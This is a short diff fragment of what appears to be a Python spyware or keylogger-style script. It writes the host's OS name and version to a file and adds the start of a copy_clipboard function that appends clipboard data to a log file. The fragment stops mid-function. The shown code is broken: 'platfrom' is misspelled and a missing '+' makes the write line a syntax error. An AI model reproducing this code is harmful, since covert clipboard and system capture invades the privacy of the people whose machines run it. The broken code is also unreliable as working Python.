@@ -75,3 +75,6 @@ def system_information():
         f.write("system_info: " + platfrom.system() + " " + platfrom.version() '\n')
 
 system_information()
+
+def copy_clipboard():
+    with open(file_merge + clipboard_info, "a") as f:
